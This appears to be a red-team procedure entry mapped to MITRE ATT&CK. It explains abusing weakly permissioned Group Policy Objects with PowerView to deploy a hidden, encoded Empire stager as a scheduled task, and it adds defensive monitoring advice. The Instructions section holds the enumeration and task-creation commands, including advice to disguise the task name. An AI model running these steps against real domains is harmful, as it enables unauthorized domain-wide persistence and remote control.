---
id: 8c4a77f0-6492-4b4d-be30-85154d0bc348
name: Abuse-GPO-with-PowerView-to-Push-Empire-Stager
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:03.724499+00:00'
updated_at: '2023-04-10T20:26:34.284443+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Command-Line Interface|T1059 - Command-Line Interface]]'
  - '[[techniques/Group Policy Modification|T1484 - Group Policy Modification]]'
sub_techniques:
  - '[[sub-techniques/PowerShell|T1059.001 - PowerShell]]'
tags:
  - '[[tags/Abuse GPO with PowerView]]'
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Exploit Group Policy Objects GPO]]'
  - gpo-abuse
  - powershell
  - empire
commands:
  - '[[commands/Get-NetGPO-Enumerate-with-ObjectACL]]'
  - '[[commands/New-GPOImmediateTask-Create-Scheduled-Task]]'
platforms:
  - Windows
  - Active Directory
tools:
  - '[[tools/PowerView]]'
  - '[[tools/Empire]]'
validated: true
---

# Abuse-GPO-with-PowerView-to-Push-Empire-Stager

## Summary

This procedure demonstrates how to abuse Group Policy Objects (GPOs) in an Active Directory environment using PowerView to identify vulnerable GPOs with weak ACLs, then modify them to deploy an Empire stager via a scheduled task. This technique allows attackers to achieve persistence and execute malicious code across domain-joined systems without direct user interaction.

## Description

Abusing GPOs is a powerful post-exploitation technique for persistence and lateral movement in Windows Active Directory environments. PowerView, a PowerShell module for AD reconnaissance, is used to enumerate all GPOs and their access control lists (ACLs) to find those where the attacker has edit rights (e.g., due to misconfigured permissions). Once a vulnerable GPO like 'VulnGPO' is identified, the New-GPOImmediateTask function (from PowerView) is invoked to create an immediate scheduled task within the GPO that executes a base64-encoded PowerShell stager from Empire. This task runs on all machines applying the GPO during the next policy refresh, establishing reverse connections back to the attacker's Empire server. The approach leverages domain admin privileges or delegated rights, mapping to MITRE ATT&CK techniques for group policy modification and PowerShell execution. Success enables long-term access for data exfiltration or further compromise, but requires domain-level access and can be detected through GPO change monitoring.

## Requirements

1. Domain user credentials with sufficient privileges to enumerate and modify GPOs (e.g., domain admin or delegated edit rights on target GPO).
2. PowerView PowerShell module loaded on the attacker's system or compromised host.
3. Empire framework installed and running with a listener configured for the stager.
4. Network access to the domain controller for AD queries and GPO modifications.
5. Base64-encoded Empire stager payload ready (generated via Empire's usestager command).

## Defense

- Secure GPOs with strict ACLs, limiting edit rights to trusted admins only and regularly auditing permissions.
- Monitor for GPO modifications using tools like Microsoft Advanced Group Policy Management (AGPM) or event logs (Event ID 5136 for directory service changes).
- Implement network segmentation to restrict lateral movement and use endpoint detection to flag anomalous scheduled tasks or PowerShell executions.
- Enable PowerShell logging (Module, Script Block, and Transcription) and constrain script execution via Constrained Language Mode.

## Objectives

1. Enumerate GPOs to identify those with modifiable ACLs for abuse.
2. Deploy an Empire stager via GPO scheduled task for persistence and C2 establishment.
3. Achieve execution on multiple domain-joined systems without direct access.
4. Enable lateral movement and long-term foothold in the Active Directory environment.

## Instructions

### Step 1: Enumerate GPOs and ACLs

**Context**: Use PowerView to list all GPOs in the domain and resolve their ACLs to identify vulnerable ones where you have 'GenericAll' or 'WriteDacl' permissions. This step reveals edit rights on GPOs like 'VulnGPO' that can be abused.

**Command** ([[commands/Get-NetGPO-Enumerate-with-ObjectACL]]):

```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
```

> This command pipes each GPO object to Get-ObjectAcl, resolving GUIDs to friendly names for readability. It outputs ACL details, including SIDs and rights. Look for entries granting your user/group edit permissions.

### Step 2: Deploy Empire Stager via Vulnerable GPO

**Context**: Once a vulnerable GPO (e.g., 'VulnGPO') is identified, use New-GPOImmediateTask to create a scheduled task that executes the base64-encoded Empire stager. The task runs immediately on policy refresh, connecting back to your Empire listener for a foothold.

**Command** ([[commands/New-GPOImmediateTask-Create-Scheduled-Task]]):

```powershell
New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments '-NoP -NonI -W Hidden -Enc AAAAAAA...' -Force
```

> Replace 'VulnGPO' with the target GPO name, 'Debugging' with a innocuous task name, and the encoded string with your actual Empire stager (e.g., from 'usestager multi-launcher'). The -Force flag overwrites existing tasks. Verify by checking the GPO in Group Policy Management Console or running Get-GPResultantSetOfPolicy on a target machine.
